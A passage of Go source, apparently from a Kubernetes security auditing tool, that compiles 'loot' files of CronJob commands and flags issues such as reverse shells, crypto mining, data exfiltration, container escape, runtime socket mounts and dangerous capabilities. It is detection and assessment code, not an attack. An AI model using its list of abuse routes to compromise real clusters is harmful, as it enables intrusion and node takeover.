	// Sort all findings by namespace/name for consistent output
	allFindings := make([]CronJobFinding, len(findings))
	copy(allFindings, findings)
	sort.Slice(allFindings, func(i, j int) bool {
		if allFindings[i].Namespace != allFindings[j].Namespace {
			return allFindings[i].Namespace < allFindings[j].Namespace
		}
		return allFindings[i].Name < allFindings[j].Name
	})

	for _, f := range allFindings {
		var containerEntries []string
		for _, c := range f.Containers {
			// Only include containers with non-empty command or args
			if c.Command != "" || c.Args != "" {
				containerEntries = append(containerEntries, fmt.Sprintf("Container: %s", c.Name))
				containerEntries = append(containerEntries, fmt.Sprintf("  Image: %s", c.Image))
				if c.Command != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Command: %s", c.Command))
				}
				if c.Args != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Args: %s", c.Args))
				}
				containerEntries = append(containerEntries, "")
			}
		}

		// Only add workload section if it has containers with commands/args
		if len(containerEntries) > 0 {
			entrypointsContent = append(entrypointsContent, fmt.Sprintf("=== %s/%s ===", f.Namespace, f.Name))
			entrypointsContent = append(entrypointsContent, "")
			entrypointsContent = append(entrypointsContent, containerEntries...)
		}
	}

	return []internal.LootFile{
		{Name: "CronJob-Commands", Contents: strings.Join(lootContent, "\n")},
		{Name: "CronJob-Entrypoints", Contents: strings.Join(entrypointsContent, "\n")},
	}
}

// generateCronJobSecurityIssues creates a list of specific security issues and recommendations
func generateCronJobSecurityIssues(finding CronJobFinding, scheduleRisk string) []string {
	var issues []string

	// Malicious activity
	if len(finding.ReverseShells) > 0 {
		issues = append(issues, fmt.Sprintf("Reverse shell patterns detected: %s - scheduled backdoor execution", strings.Join(finding.ReverseShells, ", ")))
	}
	if len(finding.CryptoMiners) > 0 {
		issues = append(issues, fmt.Sprintf("Crypto mining patterns detected: %s - scheduled resource abuse", strings.Join(finding.CryptoMiners, ", ")))
	}
	if len(finding.DataExfiltration) > 0 {
		issues = append(issues, fmt.Sprintf("Data exfiltration patterns: %s - scheduled data theft", strings.Join(finding.DataExfiltration, ", ")))
	}
	if len(finding.ContainerEscape) > 0 {
		issues = append(issues, fmt.Sprintf("Container escape techniques: %s - scheduled node compromise", strings.Join(finding.ContainerEscape, ", ")))
	}

	// Schedule-based issues
	if scheduleRisk == shared.RiskCritical {
		issues = append(issues, fmt.Sprintf("Very frequent schedule (%s) - %s", finding.Schedule, finding.ScheduleAnalysis))
	} else if scheduleRisk == shared.RiskHigh {
		issues = append(issues, fmt.Sprintf("Frequent schedule (%s) - %s", finding.Schedule, finding.ScheduleAnalysis))
	} else if scheduleRisk == shared.RiskMedium {
		issues = append(issues, fmt.Sprintf("Moderate schedule (%s) - %s", finding.Schedule, finding.ScheduleAnalysis))
	}

	// Privileged access
	if finding.Privileged {
		issues = append(issues, "Privileged CronJob - scheduled jobs have kernel access")
	}
	if finding.HostPID {
		issues = append(issues, "hostPID enabled - scheduled jobs can view/kill host processes")
	}
	if finding.HostIPC {
		issues = append(issues, "hostIPC enabled - scheduled jobs can access host IPC")
	}
	if finding.HostNetwork {
		issues = append(issues, "hostNetwork enabled - scheduled jobs on host network")
	}

	// Dangerous hostPath mounts
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			issues = append(issues, fmt.Sprintf("Container runtime socket mounted (%s) - scheduled cluster admin access", hp))
		} else if hp == "/" || hp == "/:" {
			issues = append(issues, "Root filesystem mounted - scheduled complete node access")
		} else if strings.Contains(hp, "/var/run") {
			issues = append(issues, fmt.Sprintf("Sensitive path mounted: %s", hp))
		} else {
			issues = append(issues, fmt.Sprintf("HostPath volume: %s", hp))
		}
	}

	// Dangerous capabilities
	dangerousCaps := map[string]string{
		"SYS_ADMIN":       "full system administration",
		"SYS_MODULE":      "kernel module loading",
		"SYS_RAWIO":       "direct hardware access",
		"SYS_PTRACE":      "process debugging/injection",
		"DAC_READ_SEARCH": "bypass file read permissions",
		"NET_ADMIN":       "network configuration control",
		"SYS_BOOT":        "system reboot capability",
		"SYS_TIME":        "system time manipulation",
	}
	for _, cap := range finding.Capabilities {
		for dangerousCap, desc := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				issues = append(issues, fmt.Sprintf("Dangerous capability %s - enables %s", dangerousCap, desc))
			}
		}
	}

	// Concurrency policy
	if finding.ConcurrencyPolicy == "Allow" {
		issues = append(issues, "Concurrency policy 'Allow' - multiple jobs can run simultaneously")
	}

	// Suspension status
	if finding.Suspend {
		issues = append(issues, "CronJob is suspended - not currently running")
	} else if len(finding.BackdoorPatterns) > 0 {
		issues = append(issues, "Malicious CronJob is ACTIVE - executing on schedule")
	}

	// Cloud IAM role
	if finding.CloudRole != "" {
		if strings.Contains(strings.ToLower(finding.CloudRole), "admin") {
			issues = append(issues, fmt.Sprintf("Cloud admin role assigned: %s - scheduled jobs have elevated cloud permissions", finding.CloudRole))
		} else {
			issues = append(issues, fmt.Sprintf("Cloud IAM role: %s", finding.CloudRole))
		}
	}

	// Service account
	if finding.ServiceAccount == "default" {
		issues = append(issues, "Using default service account")
	}

	// Job history
	if finding.FailedJobsHistory > 5 {
		issues = append(issues, fmt.Sprintf("High failed job count (%d) - investigate failures", finding.FailedJobsHistory))
	}

	return issues
}
